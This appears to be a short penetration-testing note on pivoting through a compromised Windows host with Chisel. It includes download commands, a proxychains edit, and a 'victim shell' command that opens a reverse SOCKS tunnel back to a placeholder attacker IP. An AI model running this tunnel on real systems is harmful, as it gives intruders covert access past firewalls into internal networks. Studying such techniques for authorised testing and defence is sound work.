
Chisel is the preferred method of port forwarding through a windows host machine. 
- Download chisel from: https://github.com/jpillora/chisel

Below is streamlined code to download and setup Chisel for use:

```shell
# Download and clean-up the Linux version of Chisel
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
gunzip chisel_1.8.1_linux_amd64.gz
mv chisel_1.8.1_linux_amd64 chisel_1.8.1

# Download and clean-up the Windows version of Chisel
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_windows_amd64.gz
gunzip chisel_1.8.1_windows_amd64.gz
mv chisel_1.8.1_windows_amd64 chisel_1.8.1.exe
```

On our attacker, modify the last line of "/etc/proxychains4.conf" to utilize SOCKS5.
```shell
sudo nano /etc/proxychains4.conf
```

![[Pasted image 20230306165438.png]]

With the pre-requisites taken care of, we just need to move the Chisel Windows executable to our victim to establish a tunnel.

```shell
# On Attacker Box
./chisel_1.8.1 server -p <port> --reverse
# In Victim Shell
C:\Windows\Temp\chisel_1.8.1.exe client <attacker_ip>:<port> R:socks
```

This will start a listener on our attacker using an arbitrary port, but once the connection is made by the Chisel client on the compromised Windows host, we can tunnel commands through the port 1080 SOCKS5 proxy using proxychains.

Shitty Diagram Below:
```
								| FW |           <client_02>
<attacker_ip>:<port> <---> <client_01>:<port>    <client_03>
								| FW |           <client_04>
```
